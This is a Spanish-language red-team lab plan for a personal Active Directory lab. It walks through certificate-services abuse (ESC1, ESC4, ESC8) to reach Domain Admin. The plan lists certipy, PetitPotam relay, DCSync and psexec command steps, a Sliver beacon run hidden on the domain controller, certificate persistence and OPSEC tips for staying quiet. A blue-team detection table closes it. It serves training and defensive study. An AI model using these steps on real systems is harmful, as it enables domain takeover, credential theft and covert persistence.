# 🎯 OPERATION DARK GATE
### Plan de Operación — Lab-03: ADCS Abuse

---

## 📋 Ficha de Operación

| Campo | Detalle |
|-------|---------|
| **Nombre en clave** | DARK GATE |
| **Fecha de inicio** | 16/05/2026 |
| **Operador** | Adrián Camacho |
| **Adversario simulado** | APT29 (Cozy Bear) |
| **Framework** | MITRE ATT&CK v14 — Enterprise |
| **Metodología C2** | Sliver (post-explotación) |
| **Objetivo primario** | Domain Admin via ADCS Abuse (ESC1/ESC4/ESC8) |
| **Objetivo secundario** | Persistencia via certificado de Administrador |
| **Entorno** | Lab propio — DC-01 reutilizado (atackcorp.local) |
| **Herramienta principal** | Certipy v5.0.4 |

---

## 🕵️ Perfil del Adversario — APT29 (Cozy Bear)

APT29 es un grupo de amenaza persistente avanzada atribuido al SVR ruso. Sus campañas más recientes (2021-2024) incluyen el abuso sistemático de Active Directory Certificate Services como vector de escalada de privilegios y persistencia a largo plazo. El abuso de ADCS es especialmente valioso para APT29 porque los certificados tienen una validez de meses o años, proporcionando acceso persistente incluso tras rotación de contraseñas.

### TTPs de referencia (MITRE)
- [G0016 — APT29](https://attack.mitre.org/groups/G0016/)
- T1649 — Steal or Forge Authentication Certificates
- T1557 — Adversary-in-the-Middle (ESC8)
- T1078 — Valid Accounts

---

## 🏗️ Entorno de Operación

```
┌─────────────────────────────────────────────────────┐
│              RED NAT — LabRedTeam                   │
│               Segmento: 10.0.2.0/24                 │
│                                                     │
│   ┌─────────────────────────────────────────────┐   │
│   │            DC-01 (Windows Server 2022)      │   │
│   │            10.0.2.10                        │   │
│   │            atackcorp.local                  │   │
│   │            ADCS: AtackCorp-CA               │   │
│   │            IIS: http://10.0.2.10/certsrv/  │   │
│   └─────────────────────────────────────────────┘   │
│                        ▲                            │
│                        │                            │
│   ┌────────────────────┴────────────────────────┐   │
│   │                  Kali Linux                 │   │
│   │               10.0.2.9 (fijo)               │   │
│   │           Certipy v5.0.4                    │   │
│   │           Impacket (ntlmrelayx)             │   │
│   └─────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

### Máquinas del entorno

| Host | SO | IP | Rol |
|------|----|----|-----|
| DC-01 | Windows Server 2022 | `10.0.2.10` | DC + ADCS AtackCorp-CA |
| Kali | Kali Linux 2026.1 | `10.0.2.9` | Máquina operadora APT29 |

---

## 🔐 Vulnerabilidades ADCS Configuradas

### ESC1 — Enrollee Supplies Subject
**Plantilla:** `VulnerableUser`  
**Condición:** `msPKI-Certificate-Name-Flag = 1` (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)  
**Impacto:** Cualquier usuario del dominio puede solicitar un certificado con un UPN arbitrario (incluido `administrator@atackcorp.local`) y usarlo para obtener un TGT como ese usuario.

| Atributo | Valor |
|---------|-------|
| `msPKI-Certificate-Name-Flag` | `1` (EnrolleeSuppliesSubject) |
| `msPKI-Enrollment-Flag` | `0` (sin aprobación) |
| Extended Key Usage | Client Authentication ✅ |
| Enrollment Rights | `ATACKCORP\Usuarios del dominio` |
| OID | `1.3.6.1.4.1.311.21.8.3242212.7457772` |

### ESC4 — Escritura sobre plantilla
**Usuario:** `fin.garcia`  
**Permiso:** `GenericWrite` sobre la plantilla `VulnerableUser`  
**Impacto:** `fin.garcia` puede modificar los atributos de la plantilla — por ejemplo habilitar `EnrolleeSuppliesSubject` en cualquier plantilla que no lo tenga, convirtiéndola en ESC1.

### ESC8 — NTLM Relay to ADCS HTTP
**Endpoint:** `http://10.0.2.10/certsrv/`  
**Condición:** Web Enrollment habilitado sobre HTTP (sin HTTPS)  
**Impacto:** Capturar autenticación NTLM de cualquier equipo y relayarla hacia `/certsrv/certfnsh.asp` para obtener un certificado en nombre de ese equipo. Si se captura la auth del DC, se obtiene un certificado del DC → Pass-the-Certificate → Domain Admin.

---

## 🗺️ Plan de Operación — Fases

### FASE 1 — Reconnaissance ✅ COMPLETADA
**Táctica MITRE:** TA0007 — Discovery  
**Herramienta:** Certipy v5.0.4

| # | Técnica | Herramienta | Estado |
|---|---------|-------------|--------|
| 1.1 | ADCS Enumeration | `certipy-ad find` | ✅ |
| 1.2 | CA Configuration | Certipy stdout | ✅ |
| 1.3 | Vulnerable Templates | ESC1/ESC8 detectados | ✅ |

**Hallazgos confirmados:**
- `AtackCorp-CA` — Enterprise Root CA activa
- Plantilla `VulnerableUser` → **ESC1** confirmado por Certipy
- Web Enrollment HTTP → **ESC8** confirmado por Certipy

---

### FASE 2 — ESC1 Exploitation
**Táctica MITRE:** TA0006 — Credential Access  
**Técnica:** T1649 — Steal or Forge Authentication Certificates

| # | Paso | Comando | Estado |
|---|------|---------|--------|
| 2.1 | Solicitar cert como administrator | `certipy-ad req -upn administrator@atackcorp.local` | ⏳ |
| 2.2 | Autenticar con el certificado | `certipy-ad auth -pfx administrator.pfx` | ⏳ |
| 2.3 | Obtener TGT + hash NTLM | Salida de certipy auth | ⏳ |
| 2.4 | Pass-the-Hash → shell DA | `impacket-psexec / evil-winrm` | ⏳ |

**Criterio de éxito:** Hash NTLM del Administrador obtenido. Shell como DA.

---

### FASE 3 — ESC4 Exploitation
**Táctica MITRE:** TA0004 — Privilege Escalation  
**Técnica:** T1222 + T1649

| # | Paso | Comando | Estado |
|---|------|---------|--------|
| 3.1 | Guardar estado original de la plantilla | `certipy-ad template -save-old` | ⏳ |
| 3.2 | Modificar plantilla con fin.garcia | `certipy-ad template -template VulnerableUser` | ⏳ |
| 3.3 | Explotar ESC1 sobre plantilla modificada | `certipy-ad req` | ⏳ |
| 3.4 | Restaurar plantilla | `certipy-ad template -configuration <saved>` | ⏳ |

**Criterio de éxito:** Domain Admin via modificación de plantilla con usuario de bajo privilegio.

---

### FASE 4 — ESC8 Exploitation (NTLM Relay)
**Táctica MITRE:** TA0001 — Initial Access / TA0006 — Credential Access  
**Técnica:** T1557.001 — NTLM Relay

| # | Paso | Comando | Estado |
|---|------|---------|--------|
| 4.1 | Iniciar relay hacia certsrv | `certipy-ad relay -target http://10.0.2.10` | ⏳ |
| 4.2 | Forzar autenticación NTLM | `impacket-printerbug / PetitPotam` | ⏳ |
| 4.3 | Obtener certificado del DC | Relay exitoso → .pfx | ⏳ |
| 4.4 | Autenticar como DC$ | `certipy-ad auth` | ⏳ |
| 4.5 | DCSync → Domain Admin | `impacket-secretsdump` | ⏳ |

**Criterio de éxito:** Certificado del DC obtenido via relay → DCSync → hashes de dominio.

---

### FASE 5 — C2 Establishment
**Táctica MITRE:** TA0011 — Command and Control

| # | Paso | Herramienta | Estado |
|---|------|-------------|--------|
| 5.1 | Generar beacon Sliver | `generate beacon --http 10.0.2.9:443` | ⏳ |
| 5.2 | Transferir a DC-01 | Evil-WinRM upload | ⏳ |
| 5.3 | Ejecutar beacon | `Start-Process -WindowStyle Hidden` | ⏳ |
| 5.4 | Beacon activo | Sliver console | ⏳ |

---

### FASE 6 — Persistence via Certificado
**Táctica MITRE:** TA0003 — Persistence  
**Técnica:** T1649 — Certificate persistence

| # | Paso | Herramienta | Estado |
|---|------|-------------|--------|
| 6.1 | Solicitar cert con validez larga | `certipy-ad req` | ⏳ |
| 6.2 | Almacenar PFX fuera del dominio | Exportar .pfx | ⏳ |
| 6.3 | Demostrar persistencia post-rotación | `certipy-ad auth` tras cambio de pwd | ⏳ |
| 6.4 | Credential dump final | `impacket-secretsdump` | ⏳ |

**Criterio de éxito:** El certificado permite autenticarse incluso tras rotación de contraseñas.

---

## 📸 Capturas por Fase

| Fase | Archivo | Descripción | Estado |
|------|---------|-------------|--------|
| 1 | `fase1-01-certipy-find.png` | Certipy detect ESC1 + ESC8 | ⏳ |
| 1 | `fase1-02-ca-config.png` | Configuración CA AtackCorp | ⏳ |
| 2 | `fase2-01-esc1-cert-request.png` | Cert solicitado como administrator | ⏳ |
| 2 | `fase2-02-esc1-auth-tgt.png` | TGT + hash NTLM obtenidos | ⏳ |
| 2 | `fase2-03-da-shell.png` | Shell como Domain Admin | ⏳ |
| 3 | `fase3-01-esc4-template-modify.png` | fin.garcia modifica plantilla | ⏳ |
| 3 | `fase3-02-esc4-cert-obtained.png` | Cert obtenido via ESC4 | ⏳ |
| 4 | `fase4-01-esc8-relay-setup.png` | ntlmrelayx configurado | ⏳ |
| 4 | `fase4-02-esc8-cert-captured.png` | Cert DC obtenido via relay | ⏳ |
| 4 | `fase4-03-esc8-dcsync.png` | DCSync via cert DC | ⏳ |
| 5 | `fase5-01-sliver-beacon.png` | Beacon activo en DC-01 | ⏳ |
| 6 | `fase6-01-cert-persistence.png` | Persistencia via certificado | ⏳ |
| 6 | `fase6-02-objective-proof.png` | Prueba final de compromiso | ⏳ |

---

## 🛡️ Notas Operacionales (OPSEC APT29)

1. **Certipy genera mucho ruido en logs** — cada solicitud de certificado genera Event ID 4886 en el DC. En operaciones reales, espaciar las solicitudes.
2. **ESC8 requiere que SMB signing esté deshabilitado o que el relay sea hacia HTTP** — el endpoint `/certsrv/` no requiere signing.
3. **Los certificados persisten** — aunque se cambie la contraseña del Administrador, el certificado sigue siendo válido hasta su expiración. Es la técnica de persistencia más silenciosa en AD.
4. **PetitPotam / PrinterBug** — para ESC8 necesitamos forzar autenticación del DC. PetitPotam funciona sin autenticación en WS2022 si no está parcheado.

---

## 🔵 Detección (Blue Team)

| Indicador | Log | Event ID |
|-----------|-----|----------|
| Solicitud de certificado con SAN arbitrario | CA logs | 4886 + 4887 |
| Certificado emitido con UPN de Administrador | CA logs | 4887 |
| Autenticación Kerberos con certificado | DC Security | 4768 (PKINIT) |
| NTLM relay detectado | Network | IDS alert |
| Modificación de plantilla de certificado | DC Security | 4899 |

---

*Operación DARK GATE — Adrián Camacho | Mayo 2026*  
*Entorno de laboratorio — Únicamente con fines educativos*